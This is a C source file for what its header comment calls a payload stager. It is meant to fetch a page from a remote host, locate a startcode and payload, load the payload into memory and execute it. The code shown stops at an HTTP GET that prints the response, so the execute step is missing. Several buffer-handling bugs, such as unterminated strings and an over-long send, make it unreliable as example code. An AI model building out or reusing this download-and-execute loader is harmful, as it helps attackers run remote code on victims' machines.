/* 
 * Makes an HTTP request to the specified host, searches the returned data
 * for a predetermined startcode, then reads in a length param, then the
 * payload from the page. Loads that payload into a buffer, then executes it.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <fcntl.h>
#include <unistd.h>
#include <sys/stat.h>

#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <netdb.h>

void fatal(char *);
void target_lookup(const char*, struct sockaddr_in*);

void target_lookup(const char* hostname, struct sockaddr_in* target_addr){
  /* make a DNS request and turn hostname -> IP address */
  struct hostent *host_info;
  if((host_info = gethostbyname(hostname)) == NULL) {
    fatal("in hostname lookup");
  }

  /* set up the target_addr struct */
  (*target_addr).sin_family = AF_INET;
  (*target_addr).sin_port = htons(80);
  (*target_addr).sin_addr = *((struct in_addr *)host_info->h_addr);
  memset(&((*target_addr).sin_zero), '\0', 8);

  return;
}

int main(int argc, char *argv[]) {
  // open up a socket
  int sockfd;
  char host[100];
  char path[100];
  char startcode[9];
  struct sockaddr_in target_addr;
  char response[2];

  if(argc < 4) {
    printf("Usage: %s [host] [path] [startcode]\n", argv[0]);
    printf("Startcode should be exactly 8 characters.\n");
    exit(1);
  }

  // TODO dynamically allocate for efficiency
  strncpy(host, argv[1], 100);
  strncpy(path, argv[2], 100);
  strncpy(startcode, argv[3], 8);

  /* set up our target_addr struct */
  target_lookup(host, &target_addr);

  /* create and connect our socket to the host */
  if((sockfd = socket(PF_INET, SOCK_STREAM, 0)) == -1) {
    fatal("in socket");
  }

  if(connect(sockfd,
             (struct sockaddr *)&target_addr,
             sizeof(struct sockaddr)
            ) == -1) {
    fatal("connecting to target server");
  }

  /* allocate memory for the full request string */
  char *request;
  int reqlen = strlen(host) + strlen(path) + 25;
  if((request = (char *) malloc(reqlen)) == NULL) {
    fatal("allocating memory for file");
  }

  sprintf(request, "GET %s HTTP/1.1\r\nHost: %s\r\n\r\n", path, host);

  printf("%s", request);

  send(sockfd, request, reqlen, 0);

  while(recv(sockfd, response, 1, 0)) {
    printf("%s", response);
  }

  free(request);

  return 0;
}

void fatal(char *message) {
  printf("%s\n", message);
  exit(-1);
}
